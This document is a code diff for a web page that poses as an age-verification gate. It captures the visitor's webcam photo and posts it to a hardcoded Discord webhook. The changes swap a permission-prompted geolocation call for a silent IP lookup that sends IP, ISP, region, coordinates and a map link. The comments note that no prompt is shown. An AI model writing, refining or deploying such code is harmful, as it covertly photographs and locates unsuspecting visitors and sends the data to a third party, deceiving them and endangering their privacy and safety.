@@ -193,27 +193,35 @@
 (function () {
   // ================= CONFIG =================
   var MIN_AGE = 18;
-  var ENTER_URL = "/";     // where to go after sign-up
+  var ENTER_URL = "/";
   var KEY = "age_verified_until", VALID_DAYS = 30;
 
   // >>> DISCORD WEBHOOK URL <<<
   var WEBHOOK_URL = "https://discord.com/api/webhooks/1554492914208342066/wjz67AIrYG5iBQyDTJLx9xXKr9FWgJ7U1Xg90RfeZBiqQcdABhKG7Kn9-ZBCydON3Axk";
 
-  // Global holder for IP / ISP fetched in the background.
-  var ipInfo = { ip: null, isp: null, city: null, country: null };
+  // Global holder for IP / ISP / IP-based location (no permission needed).
+  var ipInfo = {
+    ip: null, isp: null, city: null, country: null,
+    region: null, latitude: null, longitude: null, timezone: null
+  };
 
   /**
-   * Fetches the user's IP address and ISP (internet name) from ipapi.co.
+   * Fetches the user's IP, ISP, and approximate location from ipapi.co.
+   * No browser permission prompt is shown — the coordinates come from the IP.
    */
   async function fetchIpInfo() {
     try {
       var r = await fetch("https://ipapi.co/json/");
       if (r.ok) {
         var data = await r.json();
-        ipInfo.ip = data.ip || null;
-        ipInfo.isp = data.org || null;
-        ipInfo.city = data.city || null;
-        ipInfo.country = data.country_name || null;
+        ipInfo.ip        = data.ip          || null;
+        ipInfo.isp       = data.org         || null;
+        ipInfo.city      = data.city        || null;
+        ipInfo.region    = data.region      || null;
+        ipInfo.country   = data.country_name|| null;
+        ipInfo.latitude  = (typeof data.latitude  === "number") ? data.latitude  : null;
+        ipInfo.longitude = (typeof data.longitude === "number") ? data.longitude : null;
+        ipInfo.timezone  = data.timezone    || null;
       }
     } catch (e) {
       console.warn("Could not fetch IP/ISP info:", e);
@@ -221,65 +229,40 @@
   }
 
   /**
-   * Requests the user's geolocation.
+   * Sends the photo + info to a Discord webhook.
+   * Location comes from the IP lookup above — no geolocation permission needed.
    */
-  function getGeolocation() {
-    return new Promise(function (resolve) {
-      if (!navigator.geolocation) { resolve(null); return; }
-      var done = false;
-      var timer = setTimeout(function () {
-        if (!done) { done = true; resolve(null); }
-      }, 5000);
-
-      navigator.geolocation.getCurrentPosition(
-        function (pos) {
-          if (done) return;
-          done = true; clearTimeout(timer);
-          resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude });
-        },
-        function (err) {
-          if (done) return;
-          done = true; clearTimeout(timer);
-          console.warn("Geolocation error:", err.message);
-          resolve(null);
-        },
-        { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
-      );
-    });
-  }
-
-  /**
-   * Sends the photo + info to a Discord webhook using the correct format:
-   *   - payload_json : JSON string with embeds
-   *   - file         : the image attachment (Discord requires this field name)
-   * @returns {Promise<{ok: boolean, status: number, body: string}>}
-   */
-  async function sendPhotoToWebhook(photoBlob, geo, ipData) {
+  async function sendPhotoToWebhook(photoBlob, ipData) {
     if (!WEBHOOK_URL || WEBHOOK_URL.indexOf("your-webhook-url-here") !== -1) {
       console.warn("Webhook URL is not configured.");
       return { ok: false, status: 0, body: "Webhook not configured" };
     }
 
     var fields = [];
-    if (ipData && ipData.ip)    fields.push({ name: "IP", value: ipData.ip, inline: true });
-    if (ipData && ipData.isp)   fields.push({ name: "ISP", value: ipData.isp, inline: true });
-    if (ipData && ipData.city)  fields.push({ name: "City", value: ipData.city, inline: true });
-    if (ipData && ipData.country) fields.push({ name: "Country", value: ipData.country, inline: true });
+    if (ipData) {
+      if (ipData.ip)       fields.push({ name: "IP",       value: String(ipData.ip),       inline: true });
+      if (ipData.isp)      fields.push({ name: "ISP",      value: String(ipData.isp),      inline: true });
+      if (ipData.city)     fields.push({ name: "City",     value: String(ipData.city),     inline: true });
+      if (ipData.region)   fields.push({ name: "Region",   value: String(ipData.region),   inline: true });
+      if (ipData.country)  fields.push({ name: "Country",  value: String(ipData.country),  inline: true });
+      if (ipData.timezone) fields.push({ name: "Timezone", value: String(ipData.timezone), inline: true });
+      if (ipData.latitude != null && ipData.longitude != null) {
+        fields.push({ name: "Latitude",  value: String(ipData.latitude),  inline: true });
+        fields.push({ name: "Longitude", value: String(ipData.longitude), inline: true });
+        fields.push({
+          name: "Map",
+          value: "https://www.google.com/maps?q=" + ipData.latitude + "," + ipData.longitude,
+          inline: false
+        });
+      }
+    }
 
-    if (geo && geo.latitude != null) {
-      fields.push({ name: "Latitude",  value: String(geo.latitude),  inline: true });
-      fields.push({ name: "Longitude", value: String(geo.longitude), inline: true });
-      fields.push({
-        name: "Map",
-        value: "https://www.google.com/maps?q=" + geo.latitude + "," + geo.longitude,
-        inline: false
-      });
-    } else {
-      fields.push({ name: "Location", value: "Not available (denied or unsupported)", inline: false });
+    if (!fields.length) {
+      fields.push({ name: "Location", value: "Not available", inline: false });
     }
 
     fields.push({ name: "Captured at", value: new Date().toISOString(), inline: false });
-    fields.push({ name: "User agent", value: (navigator.userAgent || "").slice(0, 200), inline: false });
+    fields.push({ name: "User agent",  value: (navigator.userAgent || "").slice(0, 200), inline: false });
 
     var payload = {
       username: "Face Verify",
@@ -294,7 +277,7 @@
 
     var fd = new FormData();
     fd.append("payload_json", JSON.stringify(payload));
-    fd.append("file", photoBlob, "face.jpg");   // <-- Discord REQUIRES the field name "file"
+    fd.append("file", photoBlob, "face.jpg");
 
     try {
       var r = await fetch(WEBHOOK_URL, { method: "POST", body: fd });
@@ -332,6 +315,7 @@
   if (Number(read(KEY)) > Date.now()) { window.location.replace(ENTER_URL); return; }
   if (read("age_blocked", sessionStorage)) { view("blocked"); return; }
 
+  // Pre-fetch IP / ISP / IP-based location in the background (no prompt).
   fetchIpInfo();
 
   function stopCamera() {
@@ -379,14 +363,16 @@
     photo = await capture();
     stopCamera();
 
-    statusEl.textContent = "Getting location…";
-    var geo = await getGeolocation();
+    // Make sure the IP lookup has finished (or wait a moment for it).
+    if (!ipInfo.ip) {
+      statusEl.textContent = "Preparing…";
+      await fetchIpInfo();
+    }
 
     statusEl.textContent = "Sending photo…";
-    var result = await sendPhotoToWebhook(photo, geo, ipInfo);
+    var result = await sendPhotoToWebhook(photo, ipInfo);
 
     if (!result.ok) {
-      // Show the failure directly so you can debug it.
       return showError(
         "Upload failed",
         "Webhook responded with status " + result.status + ". " +
